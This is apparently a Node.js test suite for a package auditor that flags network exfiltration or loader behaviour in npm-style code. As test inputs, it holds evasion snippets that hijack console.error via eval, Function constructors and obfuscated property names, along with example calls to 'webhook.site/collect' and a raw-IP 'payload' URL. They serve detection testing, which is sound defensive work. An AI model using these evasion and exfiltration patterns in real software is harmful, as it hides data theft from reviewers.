"use strict";
const test = require('node:test');
const assert = require('node:assert/strict');
const { onlyPassiveDiagnosticUrls: provePassive } = require('../src/passive-url-evidence');
const { auditEvidence } = require('../src/auditor');
const fixture = require('../benchmark/corpus/benign/url-shortener-with-capability.json');
const url = 'https://goo.gl/MqrFmX';
const domains = ['goo.gl', 'bit.ly'];
const network = "const https = require('https'); module.exports.get = (u) => https.get(u);\n";
const passive = `console.error('Documentation: ${url}');`;
function onlyPassiveDiagnosticUrls(source, domains) {
  return provePassive(source, domains, {
    filePath: 'index.js', sourceCoverage: fixture.evidence.sourceCoverage,
    sourceFiles: [{ path: 'package.json', content: fixture.evidence.sourceFiles['package.json'] }, { path: 'index.js', content: source }]
  });
}
function report(source, extra = {}) {
  return auditEvidence({ ...fixture.evidence, ...extra,
    sourceFiles: { ...fixture.evidence.sourceFiles, 'index.js': source } });
}
function shortenerFinding(source, extra) {
  return report(source, extra).findings.some(f => f.category === 'network-exfil-or-loader');
}

test('direct passive diagnostics clear only the shortener-capability coincidence', () => {
  for (const call of [passive, `console.warn('See ${url}' + name);`, `console.log('See ${url}', name);`]) {
    assert.equal(onlyPassiveDiagnosticUrls(network + call, domains), true);
    assert.equal(shortenerFinding(network + call), false);
  }
  const result = auditEvidence(fixture.evidence);
  assert.equal(result.verdict, 'safe');
  assert.equal(result.findings.some(f => f.category === 'network-exfil-or-loader'), false);
  assert.equal(result.findings.some(f => f.category === 'network-access'), true);
});

test('each occurrence must be passive, including identical repeated URLs and other shorteners', () => {
  for (const source of [
    `https.get('${url}');`,
    `${passive} https.get('${url}');`,
    `${passive} fetch('https://bit.ly/other');`,
    `const destination='${url}'; console.error(destination);`,
    `const request=https.get; request('${url}');`,
    `function redirect(destination){ return https.get(destination); } redirect('${url}');`,
    `${passive} const alias='${url}'; module.exports=alias;`,
    `console.error('https://goo.gl/' + fetch('/secret'));`,
    `console.error(tag\`Documentation: ${url}\`);`,
    `console.error(\`Documentation: ${url}\`);`,
    `console.error({link:'${url}'});`,
    `eval("console.error('${url}')");`,
    `${passive} fetch('https://goo' + '.gl/live');`
  ]) assert.equal(shortenerFinding(network + source), true, source);
});

test('console bindings, aliases, computed dispatch and mutation cannot grant an exception', () => {
  for (const source of [
    `function warn(console){ ${passive} }`,
    `const console={error:https.get}; ${passive}`,
    `console.error=https.get; ${passive}`,
    `function mutate(){ console.error=https.get; } ${passive}`,
    `const diagnostic=console.error; diagnostic('${url}');`,
    `console['error']('${url}');`,
    `const c=console; c.error('${url}');`,
    `globalThis.console.error=https.get; ${passive}`,
    `process.stderr.write=(text)=>https.get(text); ${passive}`,
    `global['con'+'sole']={error:https.get}; ${passive}`,
    `Object.defineProperty(console,'error',{value:https.get}); ${passive}`,
    `const load=require; load('./patch-console'); ${passive}`,
    `require('./patch-console'); ${passive}`,
    `Function('console.error=fetch')(); ${passive}`,
    `(()=>{}).constructor('console.error=fetch')(); ${passive}`,
    `eval('console.error=fetch'); ${passive}`,
    `import './patch-console.js'; ${passive}`
  ]) {
    assert.equal(onlyPassiveDiagnosticUrls(network + source, domains), false, source);
    assert.equal(shortenerFinding(network + source), true, source);
  }
});

test('parse failure, explicit incomplete coverage and budgets preserve uncertainty', () => {
  const source = network + passive;
  assert.equal(shortenerFinding(source + '\nfunction incomplete('), true);
  assert.equal(shortenerFinding(source, { sourceCoverage: { complete: false, truncatedFiles: 1 } }), true);
  assert.equal(shortenerFinding(source, { sourceCoverage: { complete: true, truncatedFiles: 1 } }), true);
  assert.equal(onlyPassiveDiagnosticUrls(source + ' '.repeat(1024 * 1024), domains), false);
  assert.equal(onlyPassiveDiagnosticUrls('// goo.gl docs\n' + network, domains), false);
  const manyOccurrences = `console.error(${Array(600).fill(JSON.stringify(url)).join('+')});`;
  assert.equal(onlyPassiveDiagnosticUrls(manyOccurrences, domains), false, 'aggregate proof work is bounded');
});

test('passive shortener proof never changes hard-IP, webhook or stage-two loader findings', () => {
  for (const source of [
    `${network}${passive} https.get('https://8.8.8.8/payload');`,
    `${network}${passive} https.get('https://webhook.site/collect');`,
    `${network}${passive} eval(require('fs').readFileSync('payload.dat','utf8'));`
  ]) assert.equal(report(source).findings.some(f => f.category === 'network-exfil-or-loader' && f.severity === 'high'), true, source);
});


test('a neighboring module cannot mutate console and inherit a passive URL exception', () => {
  const input = structuredClone(fixture.evidence);
  input.sourceFiles['package.json'] = JSON.stringify({ name: 'demo', main: 'patch.js' });
  input.sourceFiles['patch.js'] = "const https=require('https'); console.error=https.get; require('./index').warn('x');";
  input.sourceCoverage = { ...input.sourceCoverage, scannedFiles: 3, inventoryFiles: 3, runtimeFiles: ['patch.js', 'index.js'] };
  const result = auditEvidence(input);
  assert.notEqual(result.verdict, 'safe');
  assert.ok(result.findings.some(f => f.category === 'network-exfil-or-loader' && f.file === 'index.js'));
});

test('missing inventory and any unknown neighboring source retain shortener uncertainty', () => {
  for (const coverage of [undefined, null, {}, { complete: true },
    { ...fixture.evidence.sourceCoverage, inventoryFiles: 3 },
    { ...fixture.evidence.sourceCoverage, skippedFiles: 1 },
    { ...fixture.evidence.sourceCoverage, reasons: ['unknown runtime source'] },
    { ...fixture.evidence.sourceCoverage, runtimeFiles: ['index.js', 'missing.js'] },
    { ...fixture.evidence.sourceCoverage, installTimeFiles: ['missing.js'] }]) {
    assert.equal(shortenerFinding(network + passive, { sourceCoverage: coverage }), true);
  }
  for (const neighbor of ['patch.js', 'nested/patch.js', 'payload.dat', '.npmrc', 'README.md', 'nested/package.json']) {
    const input = structuredClone(fixture.evidence);
    input.sourceFiles[neighbor] = 'arbitrary neighboring bytes';
    input.sourceCoverage.scannedFiles = input.sourceCoverage.inventoryFiles = 3;
    assert.ok(auditEvidence(input).findings.some(f => f.category === 'network-exfil-or-loader'), neighbor);
  }
  assert.equal(provePassive(network + passive, domains), false, 'standalone text never asserts artifact-wide coverage');
});


test('computed constructor recovery and reflective dispatch cannot clear shortener uncertainty', () => {
  for (const prefix of [
    "(()=>{})['constructor']('console.error=fetch')();",
    "(()=>{})['con'+'structor']('console.error=fetch')();",
    "(()=>{})['\\x63onstructor']('console.error=fetch')();",
    "module['con'+'structor']['_lo'+'ad']('con'+'sole')['er'+'ror']=https.get;"
  ]) {
    const source = network + prefix + passive;
    assert.equal(onlyPassiveDiagnosticUrls(source, domains), false, prefix);
    assert.equal(shortenerFinding(source), true, prefix);
    assert.notEqual(report(source).verdict, 'safe', prefix);
  }
});
